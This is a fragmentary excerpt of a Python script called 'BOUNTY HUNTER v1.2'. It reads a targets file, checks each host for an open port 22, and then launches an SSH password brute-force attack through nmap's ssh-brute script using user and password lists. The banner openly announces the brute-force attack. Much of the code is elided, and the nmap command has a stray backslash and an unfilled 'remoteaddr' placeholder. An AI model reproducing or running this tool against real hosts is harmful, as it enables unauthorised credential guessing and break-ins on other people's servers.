...
##########################################################TITLE##############
def title():
    print_slow(Style.BRIGHT + Fore.GREEN + "==============COREXITAL DATA========================")
    print("")
    print_slow(Style.BRIGHT + Fore.GREEN + "==============BOUNTY HUNTER v1.2====================")
    print("")
    print_slow(Style.BRIGHT + Fore.GREEN + "Written by:    DEREK JOHNSTON")
    print("")
...
print("")
print_slow(Style.BRIGHT + Fore.GREEN + "If port 22 is open BountyHunter will execute a bruteforce attack")
print(Style.RESET_ALL + "")
##################TARGET POPULATION####################################
tarlist = ('targets.txt')
...
def attack():
    ...
    try:
        ...
        if result == 0:
            ...
            print(Style.RESET_ALL + "STARTING BOUNTY")
            os.system(
                'nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passes.txt \ --script-args ssh-brute.timeout=4s remoteaddr')
